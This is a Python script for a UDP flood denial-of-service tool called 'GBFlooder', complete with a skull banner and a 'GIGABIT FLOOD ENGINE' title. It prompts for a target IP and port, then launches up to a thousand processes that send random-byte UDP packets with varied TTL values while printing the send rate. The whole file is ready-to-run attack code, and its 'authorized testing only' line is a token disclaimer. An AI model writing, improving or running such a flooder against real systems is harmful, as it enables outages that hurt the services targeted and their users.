import socket
import random
import time
import threading
import sys
from multiprocessing import Process, Queue

class GBFlooder:
    def __init__(self):
        self.skull = r"""
          ▄████████████████▄
         ████████████████████
        ████▀▀▀▀▀▀▀▀▀▀▀██████
        ███▌          ▐█████
        ███▌  ☠ DEATH ▐█████
        ███▌  LINK ☠  ▐█████
        ███▌          ▐█████
        ████▄▄▄▄▄▄▄▄▄▄▄██████
         ████████████████████
          ▀████████████████▀
"""
        self.config = {
            'packet_sizes': [1200, 1400, 1472],
            'ttl_values': [32, 64, 128, 255],
            'max_threads': 1000,  # Adjust based on your VPS
            'stats_interval': 0.5
        }
        self.stats = {'sent': 0, 'start': 0}

    def show_banner(self):
        red = "\033[31m"
        orange = "\033[38;5;208m"
        print(f"{red}{self.skull}{orange}")
        print("⚡ GIGABIT FLOOD ENGINE ⚡")
        print("► Multi-TTL ► Socket Reuse ► Zero-Copy")
        print("► WARNING: For authorized testing only!\033[0m\n")

    def create_socket(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, random.choice(self.config['ttl_values']))
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)  # 1MB buffer
                return sock
            except:
                time.sleep(0.01)

    def flood_process(self, target_ip, target_port, queue):
        sock = self.create_socket()
        payload = random.randbytes(max(self.config['packet_sizes']))
        count = 0
        
        while self.stats['start']:
            try:
                sock.sendto(payload[:random.choice(self.config['packet_sizes'])], (target_ip, target_port))
                count += 1
                if count % 100 == 0:  # Reduce queue operations
                    queue.put(count)
                    count = 0
            except:
                sock = self.create_socket()

    def stats_monitor(self, queue):
        last_update = time.time()
        while self.stats['start']:
            try:
                self.stats['sent'] += queue.get_nowait()
            except:
                pass
            
            now = time.time()
            if now - last_update >= self.config['stats_interval']:
                elapsed = now - self.stats['start']
                mb_sent = (self.stats['sent'] * 1400) / (1024*1024)
                speed = mb_sent / elapsed if elapsed > 0 else 0
                sys.stdout.write(f"\r[☠] Speed: {speed:.1f} MB/s | Total: {mb_sent:.1f} MB")
                sys.stdout.flush()
                last_update = now
            time.sleep(0.01)

    def launch(self, ip, port, threads=None):
        self.stats['start'] = time.time()
        threads = min(threads or self.config['max_threads'], self.config['max_threads'])
        queue = Queue()
        
        print(f"[!] Launching {threads} attack processes...")
        
        # Start flood processes
        processes = []
        for _ in range(threads):
            p = Process(target=self.flood_process, args=(ip, port, queue))
            p.start()
            processes.append(p)
        
        # Start stats monitor
        stats_thread = threading.Thread(target=self.stats_monitor, args=(queue,))
        stats_thread.start()
        
        try:
            while True: 
                time.sleep(1)
                # Auto-scale check could be added here
        except KeyboardInterrupt:
            self.stats['start'] = 0
            for p in processes:
                p.terminate()
            stats_thread.join()
            elapsed = time.time() - self.stats['start']
            print(f"\n[!] Attack finished after {elapsed:.1f} seconds")

if __name__ == "__main__":
    flooder = GBFlooder()
    flooder.show_banner()
    
    try:
        target = input("Target IP: ")
        port = int(input("Target Port: "))
        threads = int(input(f"Threads [{flooder.config['max_threads']}]: ") or flooder.config['max_threads'])
        
        print("\n[!] Press CTRL+C to stop\n")
        flooder.launch(target, port, threads)
        
    except Exception as e:
        print(f"[X] Error: {str(e)}")